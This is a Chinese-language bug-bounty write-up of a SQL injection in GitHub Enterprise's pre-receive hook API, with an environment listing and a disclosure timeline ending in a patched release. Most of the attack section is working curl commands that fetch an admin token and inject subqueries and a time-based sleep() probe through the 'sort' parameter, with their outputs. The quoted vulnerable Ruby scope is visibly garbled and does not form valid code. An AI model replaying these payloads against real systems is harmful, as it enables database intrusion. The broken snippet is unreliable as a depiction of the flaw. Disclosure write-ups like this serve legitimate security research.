### 关于应用程序环境

- **Ruby版本**: 2.1.7 (x86_64-linux)
- **RubyGems版本**: 2.2.5
- **Rack版本**: 1.6.4
- **Rails版本**: 3.2.22.4
- **JavaScript运行时**: Node.js (V8)
- **Active Record版本**: 3.2.22.4
- **Action Pack版本**: 3.2.22.4
- **Action Mailer版本**: 3.2.22.4
- **Active Support版本**: 3.2.22.4
- **中间件**:
  - GitHub::DefaultRoleMiddleware
  - Rack::Runtime
  - Rack::MethodOverride
  - ActionDispatch::RequestId
  - Rails::Rack::Logger
  - ActionDispatch::ShowExceptions
  - ActionDispatch::DebugExceptions
  - ActionDispatch::Callbacks
  - ActiveRecord::ConnectionAdapters::ConnectionManagement
  - ActionDispatch::Cookies
  - ActionDispatch::Session::CookieStore
  - ActionDispatch::Flash
  - ActionDispatch::ParamsParser
  - ActionDispatch::Head
  - Rack::ConditionalGet
  - Rack::ETag
  - ActionDispatch::BestStandardsSupport
- **应用程序根目录**: /data/github/9fcdcc8
- **环境**: 生产
- **数据库适配器**: githubmysql2
- **数据库模式版本**: 20161003225024

大部分代码是用Ruby编写的（Ruby on Rails 和 Sinatra）。

- `/data/github/` 看起来是在80/tcp和443/tcp端口下运行的应用，并且可能是github.com、gist.github.com和api.github.com的代码库。
- `/data/render/` 看起来是render.githubusercontent.com的代码库。
- `/data/enterprise-manage/` 应该是8443/tcp端口下对应的应用。

GitHub企业版使用`enterprise`和`dotcom`来检查应用是否运行在企业模式或GitHub dot com模式。

### 漏洞发现

我花费了大约一周的时间来发现这个漏洞。尽管我对Ruby不熟悉，但实践是最好的学习方式。以下是这一周的大致进度：

- **Day 1**: 安装和配置虚拟机
- **Day 2**: 继续安装和配置虚拟机
- **Day 3**: 通过代码审计学习Rails
- **Day 4**: 通过代码审计学习Rails
- **Day 5**: 通过代码审计学习Rails
- **Day 6**: 成功发现了SQL注入漏洞

#### SQL注入漏洞

该漏洞是在GitHub企业版中的`PreReceiveHookTarget`模块中发现的，具体位于`/data/github/current/app/models/pre_receive_hook_target.rb`的第45行：

```ruby
scope :sorted_by, -> (order, direction = nil) {    
  direction = "DESC" == "#{direction}".upcase ? "DESC" : "ASC"
  select( org = find_org!
```

相关代码片段如下：

```ruby
def sort(scope)
  scope.sorted_by("hook.#{params[:sort] || 'id'}", params[:direction] || 'asc')
end
```

可以看到`params[:sort]`作为参数被传入到`scope.sorted_by`中，因此我们可以注入恶意payload到`params[:sort]`。在触发该漏洞之前，我们需要一个合法的`access_token`来访问API。可以通过以下命令获取：

```sh
$ curl -k -u 'nogg:nogg' 'https://192.168.187.145/api/v3/authorizations' -d '{"scopes":"admin:pre_receive_hook","note":"x"}'
{
  "id": 4,
  "url": "https://192.168.187.145/api/v3/authorizations/4",
  "app": {
    "name": "x",
    "url": "https://developer.github.com/enterprise/2.8/v3/oauth_authorizations/",
    "client_id": "00000000000000000000"
  },
  "token": "????????",
  "hashed_token": "1135d1310cbe67ae931ff7ed8a09d7497d4cc008ac730f2f7f7856dc5d6b39f4",
  "token_last_eight": "1fadac36",
  "note": "x",
  "note_url": null,
  "created_at": "2017-01-05T22:17:32Z",
  "updated_at": "2017-01-05T22:17:32Z",
  "scopes": [
    "admin:pre_receive_hook"
  ],
  "fingerprint": null
}
```

一旦获取到了`access_token`，我们就可以通过以下方式来触发漏洞：

```sh
$ curl -k -H 'Accept:application/vnd.github.eye-scream-preview' 'https://192.168.187.145/api/v3/organizations/1/pre-receive-hooks?access_token=????????&sort=id,(select+1+from+information_schema.tables+limit+1,1)'
[
]

$ curl -k -H 'Accept:application/vnd.github.eye-scream-preview' 'https://192.168.187.145/api/v3/organizations/1/pre-receive-hooks?access_token=????????&sort=id,(select+1+from+mysql.user+limit+1,1)'
{
  "message": "Server Error",
  "documentation_url": "https://developer.github.com/enterprise/2.8/v3/orgs/pre_receive_hooks"
}

$ curl -k -H 'Accept:application/vnd.github.eye-scream-preview' 'https://192.168.187.145/api/v3/organizations/1/pre-receive-hooks?access_token=????????&sort=id,if(user()="github@localhost",sleep(5),user())'
{
  ...
}
```

### 时间线

- **2016/12/26 05:48**: 通过HackerOne向GitHub报告漏洞
- **2016/12/26 08:39**: GitHub确认漏洞并着手修复
- **2016/12/26 15:48**: 提供更多的漏洞细节
- **2016/12/28 02:44**: GitHub回复漏洞将在下一个版本中修复
- **2017/01/04 06:41**: GitHub奖励$5000 USD漏洞奖金
- **2017/01/05 02:37**: 询问如果要发表博客是否有需要注意的点
- **2017/01/05 03:06**: GitHub表示同意发表博客
- **2017/01/05 07:06**: GitHub企业版2.8.5发布

希望这些信息对你有所帮助。如果有任何问题，请随时联系我。